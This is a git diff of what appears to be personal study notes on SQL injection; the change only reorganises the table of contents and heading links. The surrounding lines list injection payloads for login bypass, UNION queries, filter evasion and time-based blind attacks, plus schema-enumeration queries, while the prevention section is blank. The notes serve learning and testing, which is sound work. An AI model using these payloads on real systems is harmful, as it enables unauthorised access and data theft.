@@ -31,25 +31,22 @@ This attack allowed the user to drop the table when it should be allowed.
 - `--` commented the following `'` that was there from the server's query
 	- Comments could sometime be `#`
 
-## Table of Contents
 <!-- TOC -->
 
-- [SQL InjectionSQLi](#sql-injectionsqli)
-	- [Table of Contents](#table-of-contents)
-	- [Common SQLi attacks](#common-sqli-attacks)
-		- [Logins](#logins)
-	- [How do you know the website is using SQL?](#how-do-you-know-the-website-is-using-sql)
-	- [How do you know which SQL database is being used?](#how-do-you-know-which-sql-database-is-being-used)
-	- [How do you know what all the tables are in the db?](#how-do-you-know-what-all-the-tables-are-in-the-db)
-	- [How do you know what all the columns in a table are?](#how-do-you-know-what-all-the-columns-in-a-table-are)
-	- [Types of SQLi](#types-of-sqli)
-		- [Boolean based SQLi](#boolean-based-sqli)
-		- [Blind SQLi](#blind-sqli)
-	- [How to prevent SQLis](#how-to-prevent-sqlis)
+- [Common SQLi attacks](#common-sqli-attacks)
+	- [Logins](#logins)
+- [How do you know the website is using SQL?](#how-do-you-know-the-website-is-using-sql)
+- [How do you know which SQL database is being used?](#how-do-you-know-which-sql-database-is-being-used)
+- [How do you know what all the tables are in the db?](#how-do-you-know-what-all-the-tables-are-in-the-db)
+- [How do you know what all the columns in a table are?](#how-do-you-know-what-all-the-columns-in-a-table-are)
+- [Types of SQLi](#types-of-sqli)
+	- [Boolean based SQLi](#boolean-based-sqli)
+	- [Blind SQLi](#blind-sqli)
+- [How to prevent SQLis](#how-to-prevent-sqlis)
 
 <!-- /TOC -->
 
-## [Common SQLi attacks](#table-of-contents)
+## [Common SQLi attacks](#sql-injectionsqli)
 - `' OR 1=1; YOUR INJECTION HERE; --`
 - `' UNION SELECT column FROM table; --`
 	- When getting back a query you sometimes need an exact amount of columns. Use `, 1` to get this.
@@ -58,7 +55,7 @@ This attack allowed the user to drop the table when it should be allowed.
 - `0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z`
 	- Possibly bypasses filters
 
-### [Logins](#table-of-contents)
+### [Logins](#sql-injectionsqli)
 Bypassing logins
 - `SELECT * FROM users WHERE password = '' AND username = ''` or `SELECT * FROM users WHERE username = '' AND password = ''`
 	- Whichever is first, username input or password input: `' OR 1=1; --`
@@ -68,13 +65,13 @@ Bypassing logins
 `admin'--`
 `administrator'--`
 
-## [How do you know the website is using SQL?](#table-of-contents)
+## [How do you know the website is using SQL?](#sql-injectionsqli)
 - Look for SQL keywords in source code which may tell you what they are using.
 - Input single quote `'` and look for errors
 - Input some SQL and see how that changes the responses. Ex: `ASCII(97)`
 	- How does this work?
 
-## [How do you know which SQL database is being used?](#table-of-contents)
+## [How do you know which SQL database is being used?](#sql-injectionsqli)
 - MySQL: `SELECT VERSION();`
 - Postgres: `SELECT version();`
 - SQL Server: `SELECT @@VERSION;`
@@ -83,22 +80,22 @@ Bypassing logins
 	- https://www.techonthenet.com/sqlite/sys_tables/index.php
 - IBM Db2: `SELECT * FROM sysibm.sysversions;`
 
-## [How do you know what all the tables are in the db?](#table-of-contents)
+## [How do you know what all the tables are in the db?](#sql-injectionsqli)
 - MySQL: `SHOW TABLES;`
 - Postgres, SQL Server: `SELECT * FROM information_schema.tables`
 - Oracle: `SELECT table_name FROM user_tables;`
 - SQLite: `SELECT name FROM sqlite_master;`
 - IBM Db2: `SELECT tabname FROM syscat.tables'`
 
-## [How do you know what all the columns in a table are?](#table-of-contents)
+## [How do you know what all the columns in a table are?](#sql-injectionsqli)
 - MySQL and Oracle: `DESCRIBE table_name;` or `SHOW COLUMNS FROM table_name;`
 - Postgres, SQL Server: `SELECT COLUMN_NAME from information_schema.columns where table_name = 'table_name'`
 - SQLite doesn't have this feature.
 - IBM Db2: `SELECT colname FROM syscat.columns WHERE tabname = 'table_name';`
 
-## [Types of SQLi](#table-of-contents)
+## [Types of SQLi](#sql-injectionsqli)
 
-### [Boolean based SQLi](#table-of-contents)
+### [Boolean based SQLi](#sql-injectionsqli)
 Boolean based SQLi happen when you only get a boolean value back from your SQLi and you have to extract information through this boolean value.
 - Determine if it is a boolean based SQLi
 	- The output from `' OR 1=1; --` is different from `' OR 1=2; --`
@@ -115,14 +112,14 @@ Boolean based SQLi happen when you only get a boolean value back from your SQLi 
 
 - Look at the response differences between 
 
-### [Blind SQLi](#table-of-contents)
+### [Blind SQLi](#sql-injectionsqli)
 Blind SQLi are where the attacker cannot see any responses, including errors, from the db.
 
 - Time based attacks
 	- Payloads designed to trigger time delays. Ex: `'; WAITFOR DELAY ('0:0:20');--` or `SELECT SLEEP(20);--`
 - Out-of-bound network interactions - the attacker injects SQL which triggers the database to communicate with the attacker's server.
 
-## [How to prevent SQLis](#table-of-contents)
+## [How to prevent SQLis](#sql-injectionsqli)
 - 
 
 `SELECT * FROM products WHERE category = 'Gitfs' OR 1=1 --'`
